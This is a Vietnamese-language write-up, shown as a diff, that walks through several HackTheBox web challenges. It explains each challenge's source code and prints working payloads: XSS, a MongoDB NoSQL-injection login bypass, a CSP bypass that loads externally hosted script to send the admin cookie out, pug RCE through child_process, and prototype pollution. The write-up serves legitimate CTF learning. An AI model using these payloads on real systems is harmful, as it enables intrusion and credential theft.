+generate = lambda x: &quot;&quot;.join([random.choice(string.hexdigits) for _ in range(x)])
+BOT_TOKEN = generate(16)
+
+def blacklist_pass(email):
+    email = email.lower()
+
+    if &quot;script&quot; in email:
+        return False
+
+    return True
+
+
+def send_flag(user_ip):
+    for id, ip in socket_clients.items():
+        if ip == user_ip:
+            socketio.emit(&quot;flag&quot;, {&quot;flag&quot;: open(&quot;flag.txt&quot;).read()}, room=id)
+
+
+def start_bot(user_ip):
+    from selenium import webdriver
+    from selenium.webdriver.chrome.options import Options
+    from selenium.webdriver.chrome.service import Service
+    from selenium.webdriver.support.ui import WebDriverWait
+    from selenium.webdriver.support import expected_conditions as EC
+
+    host, port = &quot;localhost&quot;, 1337
+    HOST = f&quot;http://{host}:{port}&quot;
+
+    options = Options()
+
+    options.add_argument(&quot;--headless&quot;)
+    options.add_argument(&quot;--no-sandbox&quot;)
+    options.add_argument(&quot;--disable-dev-shm-usage&quot;)
+    options.add_argument(&quot;--disable-infobars&quot;)
+    options.add_argument(&quot;--disable-background-networking&quot;)
+    options.add_argument(&quot;--disable-default-apps&quot;)
+    options.add_argument(&quot;--disable-extensions&quot;)
+    options.add_argument(&quot;--disable-gpu&quot;)
+    options.add_argument(&quot;--disable-sync&quot;)
+    options.add_argument(&quot;--disable-translate&quot;)
+    options.add_argument(&quot;--hide-scrollbars&quot;)
+    options.add_argument(&quot;--metrics-recording-only&quot;)
+    options.add_argument(&quot;--mute-audio&quot;)
+    options.add_argument(&quot;--no-first-run&quot;)
+    options.add_argument(&quot;--dns-prefetch-disable&quot;)
+    options.add_argument(&quot;--safebrowsing-disable-auto-update&quot;)
+    options.add_argument(&quot;--media-cache-size=1&quot;)
+    options.add_argument(&quot;--disk-cache-size=1&quot;)
+    options.add_argument(&quot;--user-agent=HTB/1.0&quot;)
+
+    service = Service(executable_path=&quot;/usr/bin/chromedriver&quot;)
+    browser = webdriver.Chrome(service=service, options=options)
+
+    try:
+        browser.get(f&quot;{HOST}/bot?token={BOT_TOKEN}&quot;)
+
+        WebDriverWait(browser, 3).until(EC.alert_is_present())
+
+        alert = browser.switch_to.alert
+        alert.accept()
+        send_flag(user_ip)
+    except Exception as e:
+        pass
+    finally:
+        registered_emails.clear()
+        browser.quit()
+
+
+@app.route(&quot;/&quot;)
+def index():
+    return render_template(&quot;index.html&quot;)
+
+
+@app.route(&quot;/api/register&quot;, methods=[&quot;POST&quot;])
+def register():
+    if not request.is_json or not request.json[&quot;email&quot;]:
+        return abort(400)
+    
+    if not blacklist_pass(request.json[&quot;email&quot;]):
+        return abort(401)
+
+    registered_emails.append(request.json[&quot;email&quot;])
+    Thread(target=start_bot, args=(request.remote_addr,)).start()
+    return {&quot;success&quot;:True}
+
+
+@app.route(&quot;/bot&quot;)
+def bot():
+    if request.args.get(&quot;token&quot;, &quot;&quot;) != BOT_TOKEN:
+        return abort(404)
+    return render_template(&quot;bot.html&quot;, emails=registered_emails)
+
+
+@socketio.on(&quot;connect&quot;)
+def on_connect():
+    socket_clients[request.sid] = request.remote_addr
+
+
+@socketio.on(&quot;disconnect&quot;)
+def on_disconnect():
+    del socket_clients[request.sid]
+
+
+if __name__ == &quot;__main__&quot;:
+    app.run(host=&quot;0.0.0.0&quot;, port=1337, debug=False)
+
+</code></pre><ul>
+<li>Quan sát đầu tiên ta có /api/register method POST sẽ nhận email sau đó sẽ filter blacklist :</li>
+</ul>
+<pre><code>def blacklist_pass(email):
+    email = email.lower()
+
+    if &quot;script&quot; in email:
+        return False
+
+    return True
+</code></pre><ul>
+<li>Sau đó <code>registered_emails.append</code> thêm vào mảng này giá trị của email.</li>
+<li>Có thể hiểu tại sao js gửi trực tiếp trong devtool nhưng không được vì:</li>
+</ul>
+<pre><code>def send_flag(user_ip):
+    for id, ip in socket_clients.items():
+        if ip == user_ip:
+            socketio.emit(&quot;flag&quot;, {&quot;flag&quot;: open(&quot;flag.txt&quot;).read()}, room=id)
+</code></pre><ul>
+<li>Phải ip nằm trong user_ip mới có thể nhận được flag.</li>
+<li>
+<ul>
+<li>Nó tạo một Thread để start_bot với arg là <code>request.remote_addr</code> và đầy là hàm start_bot:</li>
+</ul>
+</li>
+</ul>
+<pre><code>def start_bot(user_ip):
+    from selenium import webdriver
+    from selenium.webdriver.chrome.options import Options
+    from selenium.webdriver.chrome.service import Service
+    from selenium.webdriver.support.ui import WebDriverWait
+    from selenium.webdriver.support import expected_conditions as EC
+
+    host, port = &quot;localhost&quot;, 1337
+    HOST = f&quot;http://{host}:{port}&quot;
+
+    options = Options()
+
+    options.add_argument(&quot;--headless&quot;)
+    options.add_argument(&quot;--no-sandbox&quot;)
+    options.add_argument(&quot;--disable-dev-shm-usage&quot;)
+    options.add_argument(&quot;--disable-infobars&quot;)
+    options.add_argument(&quot;--disable-background-networking&quot;)
+    options.add_argument(&quot;--disable-default-apps&quot;)
+    options.add_argument(&quot;--disable-extensions&quot;)
+    options.add_argument(&quot;--disable-gpu&quot;)
+    options.add_argument(&quot;--disable-sync&quot;)
+    options.add_argument(&quot;--disable-translate&quot;)
+    options.add_argument(&quot;--hide-scrollbars&quot;)
+    options.add_argument(&quot;--metrics-recording-only&quot;)
+    options.add_argument(&quot;--mute-audio&quot;)
+    options.add_argument(&quot;--no-first-run&quot;)
+    options.add_argument(&quot;--dns-prefetch-disable&quot;)
+    options.add_argument(&quot;--safebrowsing-disable-auto-update&quot;)
+    options.add_argument(&quot;--media-cache-size=1&quot;)
+    options.add_argument(&quot;--disk-cache-size=1&quot;)
+    options.add_argument(&quot;--user-agent=HTB/1.0&quot;)
+
+    service = Service(executable_path=&quot;/usr/bin/chromedriver&quot;)
+    browser = webdriver.Chrome(service=service, options=options)
+
+    try:
+        browser.get(f&quot;{HOST}/bot?token={BOT_TOKEN}&quot;)
+
+        WebDriverWait(browser, 3).until(EC.alert_is_present())
+
+        alert = browser.switch_to.alert
+        alert.accept()
+        send_flag(user_ip)
+    except Exception as e:
+        pass
+    finally:
+        registered_emails.clear()
+        browser.quit()
+</code></pre><ul>
+<li>Nó sử dụng thư viện selenium gọi đến localhost:1337/bot và ở /bot sẽ hiển thị trang bot.html</li>
+</ul>
+<pre><code>// bot.html
+{% for email in emails %}
+    &lt;span&gt;{{ email|safe }}&lt;/span&gt;&lt;br/&gt;
+{% endfor %}
+</code></pre><ul>
+<li>có thể thấy trong này sẽ liệt kê tất cả những email với mode là safe.</li>
+<li>Vì vậy đây sẽ bị XSS. Nhưng mà làm sao để emit đến flag thì nó gọi đến hàm <code>send_flag(user_ip)</code> ở dưới đó luôn.</li>
+<li>Trước đó nó chuyển snags ngữ cảnh alert để hiển thị thanh cảnh báo</li>
+<li>Dùng XSS : <code>&lt;img src=1 onerror=prompt()</code>
+<img src="https://hackmd.io/_uploads/HJp-pBJUC.png" alt="image"></li>
+</ul>
+<h2 id="juggling-facts">Juggling facts</h2>
+<ul>
+<li>Một chall php có các route như sau:</li>
+</ul>
+<pre><code>
+$router = new Router();
+$router-&gt;new('GET', '/', 'IndexController@index');
+
+$router-&gt;new('POST','/api/getfacts', 'IndexController@getfacts');
+</code></pre><ul>
+<li>Ta có thể thấy chỉ có 2 route chính:</li>
+</ul>
+<pre><code>/index
+ public function index($router)
+    {
+        $router-&gt;view('index');
+    }
+</code></pre><ul>
+<li>index chỉ để hiện thị trang index.</li>
+</ul>
+<pre><code>  public function getfacts($router)
+    {
+        $jsondata = json_decode(file_get_contents('php://input'), true);
+
+        if ( empty($jsondata) || !array_key_exists('type', $jsondata))
+        {
+            return $router-&gt;jsonify(['message' =&gt; 'Insufficient parameters!']);
+        }
+
+        if ($jsondata['type'] === 'secrets' &amp;&amp; $_SERVER['REMOTE_ADDR'] !== '127.0.0.1')
+        {
+            return $router-&gt;jsonify(['message' =&gt; 'Currently this type can be only accessed through localhost!']);
+        }
+
+        switch ($jsondata['type'])
+        {
+            case 'secrets':
+                return $router-&gt;jsonify([
+                    'facts' =&gt; $this-&gt;facts-&gt;get_facts('secrets')
+                ]);
+
+            case 'spooky':
+                return $router-&gt;jsonify([
+                    'facts' =&gt; $this-&gt;facts-&gt;get_facts('spooky')
+                ]);
+            
+            case 'not_spooky':
+                return $router-&gt;jsonify([
+                    'facts' =&gt; $this-&gt;facts-&gt;get_facts('not_spooky')
+                ]);
+            
+            default:
+                return $router-&gt;jsonify([
+                    'message' =&gt; 'Invalid type!'
+                ]);
+        }
+    }
+</code></pre><ul>
+<li>Hàm này sẽ lấy php://input là một wrapper của php nó nhận global sau đó check nếu type === secrets và nếu ip khác localhot thì trả tin nhắn không thể access.</li>
+<li>Check với switch case:</li>
+<li>Nếu type <code>'facts' =&gt; $this-&gt;facts-&gt;get_facts('secrets')</code> chắn chắn thì đây là flag rồi nhưng mà ở trên ta thấy nếu type===secrets thì sẽ không cho access nhưng mà dưới này lại check.</li>
+<li>Nếu ta truyền type=true thì có thể bypass được :</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/S10FOUy80.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/H12iuIJLR.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/HJL6OIkLR.png" alt="image"></p>
+<p>flag : <code>HTB{juggl1ng_1s_d4ng3r0u5!!!}</code></p>
+<h2 id="candyvault">CandyVault</h2>
+<ul>
+<li>Một chall với python + mogodb:</li>
+<li>Nhìn sơ qua thì mình đã đoán được trang web bị dính nosqli với mogodb, trước tiên thì đây là source code chính của server:</li>
+</ul>
+<pre><code>from flask import Flask, Blueprint, render_template, redirect, jsonify, request
+from flask_bcrypt import Bcrypt
+from pymongo import MongoClient
+
+app = Flask(__name__)
+app.config.from_object(&quot;application.config.Config&quot;)
+bcrypt = Bcrypt(app)
+
+client = MongoClient(app.config[&quot;MONGO_URI&quot;])
+db = client[app.config[&quot;DB_NAME&quot;]]
+users_collection = db[&quot;users&quot;]
+
+@app.errorhandler(Exception)
+def handle_error(error):
+    message = error.description if hasattr(error, &quot;description&quot;) else [str(x) for x in error.args]
+    
+    response = {
+        &quot;error&quot;: {
+            &quot;type&quot;: error.__class__.__name__,
+            &quot;message&quot;: message
+        }
+    }
+
+    return response, error.code if hasattr(error, &quot;code&quot;) else 500
+
+
+@app.route(&quot;/&quot;, methods=[&quot;GET&quot;])
+def index():
+    return render_template(&quot;index.html&quot;)
+
+
+@app.route(&quot;/login&quot;, methods=[&quot;POST&quot;])
+def login():
+    content_type = request.headers.get(&quot;Content-Type&quot;)
+
+    if content_type == &quot;application/x-www-form-urlencoded&quot;:
+        email = request.form.get(&quot;email&quot;)
+        password = request.form.get(&quot;password&quot;)
+
+    elif content_type == &quot;application/json&quot;:
+        data = request.get_json()
+        email = data.get(&quot;email&quot;)
+        password = data.get(&quot;password&quot;)
+    
+    else:
+        return jsonify({&quot;error&quot;: &quot;Unsupported Content-Type&quot;}), 400
+
+    user = users_collection.find_one({&quot;email&quot;: email, &quot;password&quot;: password})
+
+    if user:
+        return render_template(&quot;candy.html&quot;, flag=open(&quot;flag.txt&quot;).read())
+    else:
+        return redirect(&quot;/&quot;)
+
+</code></pre><ul>
+<li>có thể thấy /login với method GET và POST ở đây ta chỉ chú tâm với POST nó sẽ nhận email và password có thể nhận theo kiểu <code>application/x-www-form-urlencoded</code> hoặc <code>application/json</code> sau đó sẽ check với mongo nếu tốn tại user thỏa mãn thì sẽ trả ra flag cho chúng ta.</li>
+<li>ở đây ta sẽ lợi dụng json để truyền với payload nosqli:</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/Hkgai8kLA.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/HyWg3I1U0.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/SkE7hIkIC.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/r11LhLJI0.png" alt="image"></p>
+<pre><code>POST /login HTTP/1.1
+Host: 94.237.63.201:41731
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Content-Type: application/json
+Content-Length: 46
+Origin: http://94.237.63.201:41731
+Connection: close
+Referer: http://94.237.63.201:41731/
+Upgrade-Insecure-Requests: 1
+Priority: u=1
+
+{&quot;email&quot;:{&quot;$ne&quot;:null},&quot;password&quot;:{&quot;$ne&quot;:null}}
+</code></pre><p>flag : <code>HTB{s4y_h1_t0_th3_c4andy_v4u1t!}</code></p>
+<h2 id="jailbreak">Jailbreak</h2>
+<ul>
+<li>Chall đơn giản trong HTB-Business dính vul XXE:</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/B1FMTU1UC.png" alt="image"></p>
+<ul>
+<li>Quan sát qua chỉ có chức năng update-firmware là gửi api:</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/BJpETU1IA.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/BJJ868kI0.png" alt="image"></p>
+<ul>
+<li>Ta lập tức thử xxe để lấy flag.txt ở root:</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/ByI9TIJL0.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/HkKqT8kUA.png" alt="image"></p>
+<p>flag : <code>HTB{bi0m3tric_l0cks_4nd_fl1ck3r1ng_l1ght5}</code></p>
+<h2 id="cursed-secret-party">Cursed Secret Party</h2>
+<ul>
+<li>Một chall với source code nodejs:</li>
+</ul>
+<pre><code>const express = require('express');
+const app = express();
+const cookieParser = require('cookie-parser');
+const bodyParser = require('body-parser');
+const nunjucks = require('nunjucks');
+const routes = require('./routes');
+const Database = require('./database');
+
+const db = new Database('party.db');
+
+app.use(bodyParser.urlencoded({ extended: false }));
+app.use(express.json());
+app.use(cookieParser());
+
+app.use(function (req, res, next) {
+    res.setHeader(
+        &quot;Content-Security-Policy&quot;,
+        &quot;script-src 'self' https://cdn.jsdelivr.net ; style-src 'self' https://fonts.googleapis.com; img-src 'self'; font-src 'self' https://fonts.gstatic.com; child-src 'self'; frame-src 'self'; worker-src 'self'; frame-ancestors 'self'; form-action 'self'; base-uri 'self'; manifest-src 'self'&quot;
+    );
+    next();
+});
+
+
+nunjucks.configure('views', {
+    autoescape: true,
+    express: app
+});
+
+app.set('views', './views');
+app.use('/static', express.static('./static'));
+
+app.use(routes(db));
+
+app.all('*', (req, res) =&gt; {
+    return res.status(404).send({
+        message: '404 page not found'
+    });
+});
+
+app.use(function (err, req, res, next) {
+    res.status(500).json({ message: 'Something went wrong!' });
+});
+
+(async () =&gt; {
+    await db.connect();
+    await db.migrate();
+    app.listen(1337, '0.0.0.0', () =&gt; console.log('Listening on port 1337'));
+})();
+</code></pre><ul>
+<li>Để ý thì trang web sẽ set middleware là một CSP :</li>
+</ul>
+<pre><code>app.use(function (req, res, next) {
+    res.setHeader(
+        &quot;Content-Security-Policy&quot;,
+        &quot;script-src 'self' https://cdn.jsdelivr.net ; style-src 'self' https://fonts.googleapis.com; img-src 'self'; font-src 'self' https://fonts.gstatic.com; child-src 'self'; frame-src 'self'; worker-src 'self'; frame-ancestors 'self'; form-action 'self'; base-uri 'self'; manifest-src 'self'&quot;
+    );
+    next();
+});
+</code></pre><ul>
+<li>Server có route được config trong file ./route.js</li>
+</ul>
+<pre><code>app.use(routes(db));
+</code></pre><pre><code>const express = require('express');
+const router = express.Router({ caseSensitive: true });
+const AuthMiddleware = require('../middleware/AuthMiddleware');
+const bot = require('../bot');
+
+let db;
+
+const response = data =&gt; ({ message: data });
+
+router.get('/', (req, res) =&gt; {
+    return res.render('index.html');
+});
+
+router.post('/api/submit', (req, res) =&gt; {
+    const { halloween_name, email, costume_type, trick_or_treat } = req.body;
+
+    if (halloween_name &amp;&amp; email &amp;&amp; costume_type &amp;&amp; trick_or_treat) {
+
+        return db.party_request_add(halloween_name, email, costume_type, trick_or_treat)
+            .then(() =&gt; {
+                res.send(response('Your request will be reviewed by our team!'));
+
+                bot.visit();
+            })
+            .catch(() =&gt; res.send(response('Something Went Wrong!')));
+    }
+
+    return res.status(401).send(response('Please fill out all the required fields!'));
+});
+
+router.get('/admin', AuthMiddleware, (req, res) =&gt; {
+    if (req.user.user_role !== 'admin') {
+        return res.status(401).send(response('Unautorized!'));
+    }
+
+    return db.get_party_requests()
+        .then((data) =&gt; {
+            res.render('admin.html', { requests: data });
+        });
+});
+
+router.get('/admin/delete_all', AuthMiddleware, (req, res) =&gt; {
+    if (req.user.user_role !== 'admin') {
+        return res.status(401).send(response('Unautorized!'));
+    }
+    
+    return db.remove_requests()
+            .then(() =&gt; res.send(response('All records are deleted!')));
+})
+
+module.exports = database =&gt; {
+    db = database;
+    return router;
+};
+</code></pre><ul>
+<li>Như bạn có thể thấy ở đây có 3 route chính nhưng trước hết thì ta sẽ kiếm vị trí của flag trước:</li>
+</ul>
+<pre><code>/bot.js
+const fs = require('fs');
+const puppeteer = require('puppeteer');
+const JWTHelper = require('./helpers/JWTHelper');
+const flag = fs.readFileSync('/flag.txt', 'utf8');
+
+const browser_options = {
+	headless: true,
+	args: [
+		'--no-sandbox',
+		'--disable-background-networking',
+		'--disable-default-apps',
+		'--disable-extensions',
+		'--disable-gpu',
+		'--disable-sync',
+		'--disable-translate',
+		'--hide-scrollbars',
+		'--metrics-recording-only',
+		'--mute-audio',
+		'--no-first-run',
+		'--safebrowsing-disable-auto-update',
+		'--js-flags=--noexpose_wasm,--jitless'
+	]
+};
+
+const visit = async () =&gt; {
+    try {
+		const browser = await puppeteer.launch(browser_options);
+		let context = await browser.createIncognitoBrowserContext();
+		let page = await context.newPage();
+
+		let token = await JWTHelper.sign({ username: 'admin', user_role: 'admin', flag: flag });
+		await page.setCookie({
+			name: 'session',
+			value: token,
+			domain: '127.0.0.1:1337'
+		});
+
+		await page.goto('http://127.0.0.1:1337/admin', {
+			waitUntil: 'networkidle2',
+			timeout: 5000
+		});
+
+		await page.goto('http://127.0.0.1:1337/admin/delete_all', {
+			waitUntil: 'networkidle2',
+			timeout: 5000
+		});
+
+		setTimeout(() =&gt; {
+			browser.close();
+		}, 5000);
+
+    } catch(e) {
+        console.log(e);
+    }
+};
+
+module.exports = { visit };
+</code></pre><ul>
+<li>Sử dụng chronium <code>puppeteer</code> sau đó truy cập /admin với token chứa flag.</li>
+<li>sau đó nó truy cập :</li>
+</ul>
+<pre><code>await page.goto('http://127.0.0.1:1337/admin/delete_all', {
+			waitUntil: 'networkidle2',
+			timeout: 5000
+		});
+</code></pre><ul>
+<li>ở endpoint /admin :</li>
+</ul>
+<pre><code>router.get('/admin', AuthMiddleware, (req, res) =&gt; {
+    if (req.user.user_role !== 'admin') {
+        return res.status(401).send(response('Unautorized!'));
+    }
+
+    return db.get_party_requests()
+        .then((data) =&gt; {
+            res.render('admin.html', { requests: data });
+        });
+});
+</code></pre><ul>
+<li>sẽ check middleware nếu là admin mới cho truy cập sau đó thực hiện query sql:</li>
+</ul>
+<pre><code>	async get_party_requests(){
+		return new Promise(async (resolve, reject) =&gt; {
+			try {
+				let stmt = await this.db.prepare('SELECT * FROM party_requests');
+				resolve(await stmt.all());
+			} catch(e) {
+				reject(e);
+			}
+		});
+	}
+</code></pre><ul>
+<li>
+<p>Trả ra tất cả bản ghi từ <code>party_requests</code> sau đó hiển thị ra trang admin.</p>
+</li>
+<li>
+<p>Còn <code>/admin/delete_all</code>:</p>
+</li>
+</ul>
+<pre><code>router.get('/admin/delete_all', AuthMiddleware, (req, res) =&gt; {
+    if (req.user.user_role !== 'admin') {
+        return res.status(401).send(response('Unautorized!'));
+    }
+    
+    return db.remove_requests()
+            .then(() =&gt; res.send(response('All records are deleted!')));
+})
+</code></pre><ul>
+<li>cũng cần role admin sau đó gọi :</li>
+</ul>
+<pre><code>	async remove_requests(){
+		return new Promise(async (resolve, reject) =&gt; {
+			try {
+				let stmt = await this.db.prepare('DELETE FROM party_requests');
+				resolve(await stmt.run());
+			} catch(e) {
+
+			}
+		})
+	}
+
+</code></pre><ul>
+<li>Thực hiện xóa tất cả bản ghi ở bảng trên.</li>
+<li>Vậy thì chỉ có thể thấy bài này có hướng XSS với page admin.html:</li>
+</ul>
+<pre><code>&lt;html&gt;
+    &lt;head&gt;
+        &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/bootstrap.min.css&quot; /&gt;
+        &lt;title&gt;Admin panel&lt;/title&gt;
+    &lt;/head&gt;
+
+    &lt;body&gt;
+        &lt;div class=&quot;container&quot; style=&quot;margin-top: 20px&quot;&gt;
+            {% for request in requests %} 
+                &lt;div class=&quot;card&quot;&gt;
+                &lt;div class=&quot;card-header&quot;&gt; &lt;strong&gt;Halloween Name&lt;/strong&gt; : {{ request.halloween_name | safe }} &lt;/div&gt;
+                &lt;div class=&quot;card-body&quot;&gt;
+                    &lt;p class=&quot;card-title&quot;&gt;&lt;strong&gt;Email Address&lt;/strong&gt;    : {{ request.email }}&lt;/p&gt;
+                    &lt;p class=&quot;card-text&quot;&gt;&lt;strong&gt;Costume Type &lt;/strong&gt;   : {{ request.costume_type }} &lt;/p&gt;
+                    &lt;p class=&quot;card-text&quot;&gt;&lt;strong&gt;Prefers tricks or treat &lt;/strong&gt;   : {{ request.trick_or_treat }} &lt;/p&gt;
+                    
+                    &lt;button class=&quot;btn btn-primary&quot;&gt;Accept&lt;/button&gt;
+                    &lt;button class=&quot;btn btn-danger&quot;&gt;Delete&lt;/button&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+            {% endfor %}
+        &lt;/div&gt;
+
+    &lt;/body&gt;
+&lt;/html&gt;
+</code></pre><ul>
+<li>Có thể thấy là thuộc tính <code> {{ request.halloween_name | safe }}</code> có thể bị XSS vì vậy ta sẽ lợi dụng nó để có thể gọi được cookie chuwad token ra bên ngoài.</li>
+<li>Đây là phương thức để add thông tin vào database:</li>
+</ul>
+<pre><code>async party_request_add(halloween_name, email, costume_type, trick_or_treat) {
+		return new Promise(async (resolve, reject) =&gt; {
+			try {
+				let stmt = await this.db.prepare('INSERT INTO party_requests (halloween_name, email, costume_type, trick_or_treat) VALUES (?, ?, ?, ?)');
+				resolve((await stmt.run(halloween_name, email, costume_type, trick_or_treat)));
+			} catch(e) {
+				reject(e);
+			}
+		});
+	}
+
+</code></pre><ul>
+<li>nó được sử dụng bới /api/submit:</li>
+</ul>
+<pre><code>router.post('/api/submit', (req, res) =&gt; {
+    const { halloween_name, email, costume_type, trick_or_treat } = req.body;
+
+    if (halloween_name &amp;&amp; email &amp;&amp; costume_type &amp;&amp; trick_or_treat) {
+
+        return db.party_request_add(halloween_name, email, costume_type, trick_or_treat)
+            .then(() =&gt; {
+                res.send(response('Your request will be reviewed by our team!'));
+
+                bot.visit();
+            })
+            .catch(() =&gt; res.send(response('Something Went Wrong!')));
+    }
+
+    return res.status(401).send(response('Please fill out all the required fields!'));
+});
+</code></pre><ul>
+<li>Nhận các giá trị như nêu trên say đó thêm vào database nếu chúng tồn tại -&gt; gọi bot để cho nó đi đến admin view</li>
+</ul>
+<h3 id="flow">Flow</h3>
+<ul>
+<li>
+<p>Tạo XSS với giá trị của  {{ request.halloween_name | safe }} cho lưu vào database sau đó bot sẽ đến admin.html và trang này hiển thị payload XSS được lưu vào db của ta -&gt; thực hiện gọi cookie của bot ra ngoài và lấy cờ với jwt.io.</p>
+</li>
+<li>
+<p>Nhưng vấn đề lớn nhất ở đây là CSP:</p>
+</li>
+</ul>
+<pre><code>app.use(function (req, res, next) {
+    res.setHeader(
+        &quot;Content-Security-Policy&quot;,
+        &quot;script-src 'self' https://cdn.jsdelivr.net ; style-src 'self' https://fonts.googleapis.com; img-src 'self'; font-src 'self' https://fonts.gstatic.com; child-src 'self'; frame-src 'self'; worker-src 'self'; frame-ancestors 'self'; form-action 'self'; base-uri 'self'; manifest-src 'self'&quot;
+    );
+    next();
+});
+</code></pre><ul>
+<li>Nhưng có một chỗ có thể lợi dụng ở đây là script cho phép nguồn từ <code>https://cdn.jsdelivr.net</code> mà ta có thể control được ở đây -&gt; tạo payload xss -&gt; tạo thẻ <!-- raw HTML omitted --><!-- raw HTML omitted --></li>
+<li>Và cuối cùng chỉ cần đợi bot call giá trị ra thôi.</li>
+<li>Có thể dùng trang web này post js của mình lên vùng nhớ của <a href="https://cdn.jsdelivr.net">https://cdn.jsdelivr.net</a></li>
+</ul>
+<p><a href="https://www.jsdelivr.com/github">https://www.jsdelivr.com/github</a></p>
+<p><img src="https://hackmd.io/_uploads/H1rnfPJIC.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/SJy0GvJ8R.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/SydxQvJUR.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/BJpIQPyUR.png" alt="image"></p>
+<pre><code>POST /api/submit HTTP/1.1
+Host: 94.237.54.176:47791
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: http://94.237.54.176:47791/
+Content-Type: application/json
+Content-Length: 183
+Origin: http://94.237.54.176:47791
+Connection: close
+Priority: u=1
+
+{&quot;halloween_name&quot;:&quot;&lt;script src=\&quot;https://cdn.jsdelivr.net/gh/l3mnt2010/jsdelivr@main/index.js\&quot;&gt;&lt;/script&gt;&quot;,&quot;email&quot;:&quot;hihi@gmail.com&quot;,&quot;costume_type&quot;:&quot;monster&quot;,&quot;trick_or_treat&quot;:&quot;tricks&quot;}
+</code></pre><p><img src="https://hackmd.io/_uploads/Byq_QDk80.png" alt="image"></p>
+<p><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwidXNlcl9yb2xlIjoiYWRtaW4iLCJmbGFnIjoiSFRCe2Qwbid0XzRsbDB3X2Nkbl8xbl9jNXAhIX0iLCJpYXQiOjE3MTg3Mzk3ODB9.dzm05GgI5Sjx73YeH7VIFXrOpG8cfd6gnBbo3oProyE</code></p>
+<p><img src="https://hackmd.io/_uploads/ry59XvJLR.png" alt="image"></p>
+<p>flag : <code>HTB{d0n't_4ll0w_cdn_1n_c5p!!}</code></p>
+<h2 id="gunship">Gunship</h2>
+<ul>
+<li>Một chall với nodejs:</li>
+</ul>
+<pre><code>
+const express       = require('express');
+const app           = express();
+const routes        = require('./routes');
+const path          = require('path');
+
+app.use(express.json());
+app.set('views','./views');
+app.use('/static', express.static(path.resolve('static')));
+
+app.use(routes);
+
+app.all('*', (req, res) =&gt; {
+    return res.status(404).send('404 page not found');
+});
+
+app.listen(1337, () =&gt; console.log('Listening on port 1337'));
+</code></pre><ul>
+<li>Quan sát các route:</li>
+</ul>
+<pre><code>const path              = require('path');
+const express           = require('express');
+const pug        		= require('pug');
+const { unflatten }     = require('flat');
+const router            = express.Router();
+
+router.get('/', (req, res) =&gt; {
+    return res.sendFile(path.resolve('views/index.html'));
+});
+
+router.post('/api/submit', (req, res) =&gt; {
+    const { artist } = unflatten(req.body);
+
+	if (artist.name.includes('Haigh') || artist.name.includes('Westaway') || artist.name.includes('Gingell')) {
+		return res.json({
+			'response': pug.compile('span Hello #{user}, thank you for letting us know!')({ user: 'guest' })
+		});
+	} else {
+		return res.json({
+			'response': 'Please provide us with the full name of an existing member.'
+		});
+	}
+});
+
+module.exports = router;
+</code></pre><ul>
+<li>Server sử dụng template pugjs và <code>flat</code> dùng để decode body, có duy nhất api này:</li>
+</ul>
+<pre><code>router.post('/api/submit', (req, res) =&gt; {
+    const { artist } = unflatten(req.body);
+
+	if (artist.name.includes('Haigh') || artist.name.includes('Westaway') || artist.name.includes('Gingell')) {
+		return res.json({
+			'response': pug.compile('span Hello #{user}, thank you for letting us know!')({ user: 'guest' })
+		});
+	} else {
+		return res.json({
+			'response': 'Please provide us with the full name of an existing member.'
+		});
+	}
+});
+</code></pre><ul>
+<li>server nhận <code>artist</code> từ body được qua <code>unflatten(req.body)</code> sau đó check nếu có <code>Haigh</code> <code>Westaway</code> <code>Gingell</code> trong artist thì sẽ hiển thị thông báo user với pugjs nếu không thì yêu cầu cung cấp từ có chứa 1 trong 3 kí tự.</li>
+<li>Searching flat bản <code>5.0.0</code> :</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/HJgLSwJU0.png" alt="image"></p>
+<p>Một cve critical với đúng version &lt; 5.0.1 bị dính prototype polution luôn.</p>
+<ul>
+<li>`var unflatten = require(&lsquo;flat&rsquo;).unflatten;</li>
+</ul>
+<p>unflatten({
+&lsquo;<strong>proto</strong>.polluted&rsquo;: true
+});</p>
+<p>console.log(polluted); // true`</p>
+<ul>
+<li>
+<p>Vấn đề ở đây là phải RCE để lấy được flag do đó ta seaching bug của pugjs thử:</p>
+</li>
+<li>
+<p>Tiếp tục là một lỗ hổng RCE đúng như ý ta:</p>
+</li>
+</ul>
+<p><img src="https://hackmd.io/_uploads/HyYb8PyUC.png" alt="image"></p>
+<p>POC của pug:</p>
+<p><code>http://localhost:5000/?p=');process.mainModule.constructor._load('child_process').exec('whoami');_=('</code></p>
+<ul>
+<li>Bây giờ ta sẽ làm Prototype polution để rce được nó.</li>
+</ul>
+<pre><code>
+	{
+			&quot;artist.name&quot;:&quot;Haigh&quot;,&quot;__proto__.block&quot;: {
+	        &quot;type&quot;: &quot;Text&quot;, 
+	        &quot;line&quot;: &quot;process.mainModule.require('child_process').execSync('')&quot;
+		    }
+		}
+</code></pre><p><img src="https://hackmd.io/_uploads/rk3XKQlL0.png" alt="image"></p>
+<p><img src="https://hackmd.io/_uploads/SJbCK7e8C.png" alt="image"></p>
